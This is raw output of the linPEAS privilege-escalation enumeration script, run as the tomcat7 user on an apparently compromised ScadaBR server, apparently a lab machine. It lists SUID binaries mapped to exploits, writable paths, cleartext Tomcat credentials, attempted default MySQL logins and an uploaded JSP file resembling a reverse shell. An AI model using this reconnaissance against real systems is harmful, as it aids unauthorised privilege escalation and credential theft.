PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

???????????????????????????????????? System timers
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                  
                                                                                                                                                            
???????????????????????????????????? Analyzing .timer files
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                  
                                                                                                                                                            
???????????????????????????????????? Analyzing .service files
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path                                                        
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
/lib/systemd/system/networking.service could be executing some relative path
/lib/systemd/system/rescue.service could be executing some relative path
You can't write on systemd PATH

???????????????????????????????????? Analyzing .socket files
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                 
                                                                                                                                                            
???????????????????????????????????? Unix Sockets Listening
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                 
sed: -e expression #1, char 0: no previous regular expression                                                                                               
/run/mysqld/mysqld.sock
  ??????(Read Write)
/var/run/mysqld/mysqld.sock
  ??????(Read Write)

???????????????????????????????????? D-Bus Service Objects list
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                   
busctl Not Found                                                                                                                                            
???????????????????????????????????? D-Bus config files                                                                                                     
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                   
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)                             
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

                              ?????????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????????????????????????????????????????????? Network Information ?????????????????????????????????????????????????????????????????????????????????????????????                                                                                                         
                              ?????????????????????????????????????????????????????????????????????                                                         
???????????????????????????????????? Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                         
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 7e:c0:c9:76:6c:bf brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.20.0.3/16 brd 172.20.255.255 scope global eth0
       valid_lft forever preferred_lft forever

???????????????????????????????????? Hostname, hosts and DNS
77f992b1ebf5                                                                                                                                                
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::  ip6-localnet
ff00::  ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.20.0.3      77f992b1ebf5

nameserver 127.0.0.11
search eu-west-1.compute.internal
options edns0 trust-ad ndots:0

???????????????????????????????????? Active Ports
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                              
tcp    LISTEN     0      4096   127.0.0.11:40593                 *:*                                                                                        
tcp    LISTEN     0      150       *:3306                  *:*                  
tcp    LISTEN     0      1      ::ffff:127.0.0.1:8005                 :::*                   users:(("java",pid=275,fd=55))
tcp    LISTEN     0      100      :::8080                 :::*                   users:(("java",pid=275,fd=53))

???????????????????????????????????? Can I sniff with tcpdump?
No                                                                                                                                                          
                                                                                                                                                            

                               ???????????????????????????????????????????????????????????????
???????????????????????????????????????????????????????????????????????????????????????????????? Users Information ????????????????????????????????????????????????????????????????????????????????????????????????                                                                                                     
                               ???????????????????????????????????????????????????????????????                                                              
???????????????????????????????????? My user
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                   
uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)                                                                                           

???????????????????????????????????? Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                            
                                                                                                                                                            
???????????????????????????????????? Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                           
                                                                                                                                                            

???????????????????????????????????? Checking sudo tokens
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                     
ptrace protection is enabled (1)                                                                                                                            

???????????????????????????????????? Checking Pkexec policy
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                               
                                                                                                                                                            
???????????????????????????????????? Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                             

???????????????????????????????????? Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                             

???????????????????????????????????? All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=106(mysql) gid=108(mysql) groups=108(mysql)
uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

???????????????????????????????????? Login now
 21:41:18 up 18 min,  0 users,  load average: 0.98, 0.27, 0.20                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

???????????????????????????????????? Last logons
                                                                                                                                                            
wtmp begins Tue Jun 10 15:14:50 2025

???????????????????????????????????? Last time logon each user
Username         Port     From             Latest                                                                                                           

???????????????????????????????????? Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                                                         
                                                                                                                                                            
???????????????????????????????????? Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                            

                             ????????????????????????????????????????????????????????????????????????
?????????????????????????????????????????????????????????????????????????????????????????? Software Information ??????????????????????????????????????????????????????????????????????????????????????????                                                                                                              
                             ????????????????????????????????????????????????????????????????????????                                                       
???????????????????????????????????? Useful software
/usr/bin/authbind                                                                                                                                           
/usr/bin/base64
/usr/bin/perl
/usr/bin/python3
/usr/bin/wget

???????????????????????????????????? Installed Compilers
                                                                                                                                                            
???????????????????????????????????? Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 869 Mar  6  2018 /etc/mysql/mariadb.cnf                                                                                              
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 277 Apr 22  2018 /etc/mysql/debian.cnf

???????????????????????????????????? Analyzing Tomcat Files (limit 70)
-rw-r----- 1 root tomcat7 1530 Jan 25  2014 /etc/tomcat7/tomcat-users.xml                                                                                   
  <user username="tomcat" password="tomcat" roles="tomcat"/>
  <user username="both" password="tomcat" roles="tomcat,role1"/>
  <user username="role1" password="tomcat" roles="role1"/>

???????????????????????????????????? Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 1 root root 4096 Apr 21  2018 /etc/pam.d                                                                                                         

???????????????????????????????????? Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                        
drwxr-xr-x 2 root root 4096 Apr 21  2018 /etc/ldap

???????????????????????????????????? Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 28  2018 /usr/share/keyrings                                                                                                
drwxr-xr-x 2 root root 4096 Feb 28  2018 /var/lib/apt/keyrings

???????????????????????????????????? Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                                                                  

-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile

???????????????????????????????????? Analyzing Windows Files (limit 70)
                                                                                                                                                            

lrwxrwxrwx 1 root root 22 Apr 22  2018 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Apr 22  2018 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Apr 22  2018 /var/lib/dpkg/alternatives/my.cnf

-rw-r--r-- 1 root tomcat7 6678 Jun 27  2016 /etc/tomcat7/server.xml

???????????????????????????????????? Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user         = mysql                                                                             
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

???????????????????????????????????? MySQL version
mysql  Ver 15.1 Distrib 10.0.34-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                   

?????? MySQL connection using default root/root ........... No
?????? MySQL connection using root/toor ................... No                                                                                              
?????? MySQL connection using root/NOPASS ................. No                                                                                              
                                                                                                                                                            
???????????????????????????????????? Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                
gpg Not Found
netpgpkeys Not Found                                                                                                                                        
netpgp Not Found                                                                                                                                            
                                                                                                                                                            
-rw-r--r-- 1 root root 12255 Feb 28  2018 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 12335 Feb 28  2018 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg

???????????????????????????????????? Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

???????????????????????????????????? Searching ssl/ssh files
????????? Some certificates were found (out limited):                                                                                                       
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                
/etc/ssl/certs/ACEDICOM_Root.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
402PSTORAGE_CERTSBIN

                      ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????
????????????????????????????????????????????????????????????????????? Files with Interesting Permissions ?????????????????????????????????????????????????????????????????????                                                                                                                                          
                      ??????????????????????????????????????????????????????????????????????????????????????????????????????????????????                    
???????????????????????????????????? SUID - Check easy privesc, exploits and write perms
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                           
strings Not Found                                                                                                                                           
strace Not Found                                                                                                                                            
-rwsr-xr-x 1 root root 11K Jul 26  2015 /usr/lib/authbind/helper                                                                                            
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 27K Nov 30  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 40K Nov 30  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

???????????????????????????????????? SGID
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                           
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd                                                                                                 
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 27K Nov 30  2017 /usr/bin/wall
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab

???????????????????????????????????? Files with ACLs (limited to 50)
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                    
files with acls in searched folders Not Found                                                                                                               
                                                                                                                                                            
???????????????????????????????????? Capabilities
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                            
????????? Current shell capabilities                                                                                                                        
CapInh:  0x0000000000000000=                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37,38,39,40
CapAmb:  0x0000000000000000=

??? Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37,38,39,40
CapAmb:  0x0000000000000000=

Files with capabilities (limited to 50):

???????????????????????????????????? Checking misconfigurations of ld.so
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                    
/etc/ld.so.conf                                                                                                                                             
Content of /etc/ld.so.conf:                                                                                                                                 
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                               
  - /usr/local/lib                                                                                                                                          
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /lib/x86_64-linux-gnu                                                                                                                                   
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
???????????????????????????????????? Files (scripts) in /etc/profile.d/                                                                                     
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                          
total 8                                                                                                                                                     
drwxr-xr-x 2 root root 4096 Apr 12  2016 .
drwxr-xr-x 1 root root 4096 Jun 21 05:43 ..

???????????????????????????????????? Permissions in init, init.d, systemd, and rc.d
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                              
                                                                                                                                                            
???????????????????????????????????? AppArmor binary profiles
-rw-r--r-- 1 root root 3310 Dec  9  2016 sbin.dhclient                                                                                                      
-rw-r--r-- 1 root root  730 Mar  6  2018 usr.sbin.mysqld

?????? Hashes inside passwd file? ........... No
?????? Writable passwd file? ................ No                                                                                                            
?????? Credentials in fstab/mtab? ........... No                                                                                                            
?????? Can I read shadow files? ............. No                                                                                                            
?????? Can I read shadow plists? ............ No                                                                                                            
?????? Can I write shadow plists? ........... No                                                                                                            
?????? Can I read opasswd file? ............. No                                                                                                            
?????? Can I write in network-scripts? ...... No                                                                                                            
?????? Can I read root folder? .............. No                                                                                                            
                                                                                                                                                            
???????????????????????????????????? Searching root files in home dirs (limit 30)
/home/                                                                                                                                                      
/root/

???????????????????????????????????? Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 1000 1000 236 Jun 10 23:54 /var/lib/tomcat7/webapps/ROOT/index.html                                                                            

???????????????????????????????????? Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root tomcat7 1530 Jan 25  2014 /etc/tomcat7/tomcat-users.xml                                                                                   

???????????????????????????????????? Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
??? https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                          
/dev/mqueue                                                                                                                                                 
/dev/shm
/etc/authbind/byuid/107
/run/lock
/run/tomcat7.pid
/tmp
/tmp/hsperfdata_tomcat7
/tmp/hsperfdata_tomcat7/275
/tmp/tomcat7-tomcat7-tmp
/var/cache/tomcat7
/var/cache/tomcat7/Catalina
/var/cache/tomcat7/Catalina/localhost
/var/cache/tomcat7/Catalina/localhost/ScadaBR
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit/editModbus_jsp$Helper.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit/editModbus_jsp.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit/editModbus_jsp.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit_jsp$Helper.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit_jsp.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceEdit_jsp.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceList_jsp$Helper.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/jsp/dataSourceList_jsp.class
#)You_can_write_even_more_files_inside_last_directory

/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/snippet
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/snippet/watchListMessages_jsp.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/WEB_002dINF/snippet/watchListMessages_jsp.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/index_jsp.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/index_jsp.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web/alarmAck_tag.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web/alarmAck_tag.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web/alarmLevelOptions_tag.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web/alarmLevelOptions_tag.java
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/tag/web/dateRange_tag.class
#)You_can_write_even_more_files_inside_last_directory

/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/uploads
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/uploads/_1_jsp$1StreamConnector.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/uploads/_1_jsp.class
/var/cache/tomcat7/Catalina/localhost/ScadaBR/org/apache/jsp/uploads/_1_jsp.java
/var/cache/tomcat7/Catalina/localhost/_
/var/lib/tomcat7
/var/lib/tomcat7/bin
/var/lib/tomcat7/common
/var/lib/tomcat7/common/classes
/var/lib/tomcat7/linpeas.sh
/var/lib/tomcat7/server
/var/lib/tomcat7/server/classes
/var/lib/tomcat7/shared
/var/lib/tomcat7/shared/classes
/var/lib/tomcat7/webapps
/var/lib/tomcat7/webapps/ROOT
/var/lib/tomcat7/webapps/ROOT/META-INF
/var/lib/tomcat7/webapps/ROOT/META-INF/context.xml
/var/lib/tomcat7/webapps/ScadaBR
/var/lib/tomcat7/webapps/ScadaBR.war
/var/lib/tomcat7/webapps/ScadaBR/META-INF
/var/lib/tomcat7/webapps/ScadaBR/META-INF/MANIFEST.MF
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/applicationContext.xml
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br/org
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br/org/scadabr
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br/org/scadabr/api
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br/org/scadabr/api/deploy.wsdd
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/br/org/scadabr/api/undeploy.wsdd
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/API.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/APILocator.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/AckEventsTest.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ActiveEventsTest.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/AnnotateEventTest.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ae/AckEventsOptions.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ae/AckEventsParams.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ae/AckEventsResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ae/ActiveEventsOptions.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/ae/AnnotateEventParams.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config/AddDataSourceParams.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config/AddDataSourceResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config/BrowseDataPointsParams.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config/BrowseDataPointsResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/config/BrowseDataSourcesParams.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants/AlarmLevel.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants/DataSourceType.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants/DataType.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants/ErrorCode.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/constants/EventType.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da/BrowseTagsOptions.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da/BrowseTagsParams.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da/BrowseTagsResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da/GetStatusResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/da/ReadDataOptions.class
#)You_can_write_even_more_files_inside_last_directory

/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/dao
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/dao/MangoDaoImpl.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/dao/ScadaBRAPIDao.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/exception
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/exception/ScadaBRAPIException.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/hda
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/hda/GetDataHistoryOptions.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/hda/GetDataHistoryParams.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/hda/GetDataHistoryResponse.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/utils
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/utils/APIConstants.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/utils/APIUtils.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo/APIError.class
/var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/br/org/scadabr/api/vo/Authentication.class
